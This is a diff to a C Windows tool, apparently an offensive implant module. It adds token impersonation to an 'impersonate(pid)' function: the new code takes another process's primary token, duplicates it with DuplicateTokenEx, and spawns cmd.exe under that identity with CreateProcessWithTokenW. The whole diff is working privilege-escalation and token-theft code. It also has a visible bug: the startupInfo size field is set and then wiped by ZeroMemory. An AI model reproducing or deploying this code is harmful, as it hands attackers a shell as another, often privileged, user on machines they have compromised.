@@ -253,13 +253,18 @@ HANDLE getPrimaryTokenFromProcess(DWORD processId) {
 
 char *impersonate(int pid){
     char *firstUser = getName();
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
+    STARTUPINFO startupInfo;
+    PROCESS_INFORMATION processInformation;
+    startupInfo.cb = sizeof(STARTUPINFO);
     HANDLE hToken = getPrimaryTokenFromProcess(pid);
     char *open = "[-] Failed to obtain duplicated token.\r\n";
     char *newUser = getName();
     char *impersonation = "[+] Impersonation successfull.\r\n";
-    HANDLE hUserToken;
+    char *dupProc = "[+] Token duplicated.\r\n";
+    char *procSpawn = "[+] Process spawned.\r\n";
+    ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
+    ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
+    HANDLE duplicateTokenHandle;
     if (hToken) {
         open = "[+] Obtained duplicated token.\r\n";
         
@@ -270,13 +275,29 @@ char *impersonate(int pid){
         }
         newUser = getName();
         RevertToSelf();
-        CloseHandle(hToken);
     }
 
-    char *result = malloc((strlen(firstUser) + strlen(open) + strlen(newUser) +strlen(impersonation))*sizeof(char) + 2); 
+    BOOL duplicateToken = DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
+    if (!duplicateToken)
+    {
+        dupProc = "[-] DuplicateTokenEx().\r\n";
+    }
+
+    // Call CreateProcessWithTokenW(), print return code and error code
+    BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
+    if (!createProcess)
+    {
+        procSpawn = "[-] CreateProcessWithTokenW Return Code\r\n";
+    }
+
+    CloseHandle(hToken);
+
+    char *result = malloc((strlen(firstUser) + strlen(open) + strlen(newUser) +strlen(impersonation) +strlen(dupProc) +strlen(procSpawn))*sizeof(char) + 2); 
     strcpy(result, firstUser);
     strcat(result, open);
     strcat(result, impersonation);
     strcat(result, newUser);
+    strcat(result, dupProc);
+    strcat(result, procSpawn);
     return result;
 }
